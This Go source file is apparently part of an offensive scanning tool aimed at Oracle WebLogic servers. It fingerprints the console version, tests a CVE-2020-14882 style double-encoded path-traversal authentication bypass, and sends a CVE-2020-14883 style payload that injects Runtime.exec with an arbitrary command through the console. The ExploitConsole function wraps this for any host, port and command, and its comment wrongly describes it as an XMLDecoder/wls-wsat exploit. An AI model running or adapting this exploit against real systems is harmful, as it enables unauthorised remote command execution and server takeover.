package weblogic

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"time"
)

// WebLogicClient handles HTTP-based WebLogic probing
type WebLogicClient struct {
	base   string
	client *http.Client
}

// New creates a new WebLogic HTTP client
func New(url string, timeout time.Duration) *WebLogicClient {
	return &WebLogicClient{
		base: url,
		client: &http.Client{
			Timeout:   timeout,
			Transport: pickTransport(nil),
		},
	}
}

// ProbeConsole checks if WebLogic Console is accessible
func (w *WebLogicClient) ProbeConsole() (bool, string) {
	// Check console page
	resp, err := w.client.Get(w.base + "/console/login/LoginForm.jsp")
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 && bytes.Contains(body, []byte("WebLogic")) {
		// Try to extract version
		re := regexp.MustCompile(`WebLogic Server.*?Version.*?(\d+\.\d+\.\d+\.\d+)`)
		m := re.FindStringSubmatch(string(body))
		if len(m) > 1 {
			return true, m[1]
		}
		return true, "unknown"
	}

	// Check wls-wsat
	resp2, err := w.client.Get(w.base + "/wls-wsat/CoordinatorPortType")
	if err == nil {
		defer resp2.Body.Close()
		if resp2.StatusCode == 200 {
			return true, "wls-wsat"
		}
	}

	return false, ""
}

// CheckBypass checks if console auth bypass works
func (w *WebLogicClient) CheckBypass() bool {
	// CVE-2020-14882 style path traversal bypass
	bypassPaths := []string{
		"/console/css/%252e%252e%252fconsole.portal",
		"/console/images/%252e%252e%252fconsole.portal",
	}

	for _, p := range bypassPaths {
		resp, err := w.client.Get(w.base + p)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode == 200 && bytes.Contains(body, []byte("WebLogic")) {
			return true
		}
	}
	return false
}

// ExecCommand executes command via console bypass + MBean
func (w *WebLogicClient) ExecCommand(cmd string) string {
	// CVE-2020-14883 style: console bypass + codebase
	payload := fmt.Sprintf(
		"/console/css/%%252e%%252e%%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('%s');\")",
		cmd)

	resp, err := w.client.Get(w.base + payload)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 200 && len(body) > 0 {
		return "exec_sent"
	}
	return ""
}

// CheckConsole probes WebLogic Console and wls-wsat endpoints
func CheckConsole(host string, port int, timeout time.Duration) string {
	w := New(fmt.Sprintf("http://%s:%d", host, port), timeout)
	ok, ver := w.ProbeConsole()
	if ok {
		return fmt.Sprintf("console_v%s", ver)
	}
	return ""
}

// ExploitConsole sends XMLDecoder deserialization payload via wls-wsat
func ExploitConsole(host string, port int, timeout time.Duration, cmd string) string {
	w := New(fmt.Sprintf("http://%s:%d", host, port), timeout)
	return w.ExecCommand(cmd)
}
